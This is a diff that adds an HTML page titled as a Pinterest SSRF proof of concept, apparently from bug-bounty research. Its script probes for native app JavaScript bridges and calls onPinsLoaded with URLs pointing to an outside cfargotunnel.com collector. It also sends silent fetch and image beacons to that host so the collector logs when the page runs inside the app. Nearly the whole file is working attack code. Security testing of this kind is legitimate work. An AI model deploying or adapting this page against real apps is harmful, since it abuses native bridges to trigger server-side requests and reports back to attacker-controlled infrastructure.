@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head><title>Pinterest SSRF PoC</title></head>
+<body>
+<script>
+(function runPoC() {
+  const bridge =
+    window.AmazonShopExternalInterfaceHandler ||
+    window.PinterestMobileInterface ||
+    window.JavaScriptInterface;
+
+  const base = "https://39a2a400-c456-42e9-a87a-f48bfc94e939.cfargotunnel.com/collect";
+
+  if (bridge && bridge.onPinsLoaded) {
+    console.log("[PoC] Bridge detected — firing SSRF");
+    fetch(base + "?ctx=bridge_detected&from=cyx2");
+
+    bridge.onPinsLoaded(
+      JSON.stringify({
+        image_url: base + "?via=bridge&from=cyx2",
+        source_url: base + "?via=source&from=cyx2",
+        title: "PoC SSRF",
+        description: "Testing SSRF via onPinsLoaded"
+      })
+    );
+  } else {
+    console.warn("[PoC] No bridge — fallback logging");
+    fetch(base + "?ctx=no_bridge&from=cyx2");
+  }
+
+  // Silent beacons
+  new Image().src = base + "?ctx=img&from=cyx2";
+  fetch(base + "?ctx=fetch&from=cyx2");
+})();
+</script>
+<p>SSRF PoC loaded. If this runs in Pinterest, your collector will log it.</p>
+</body>
+</html>
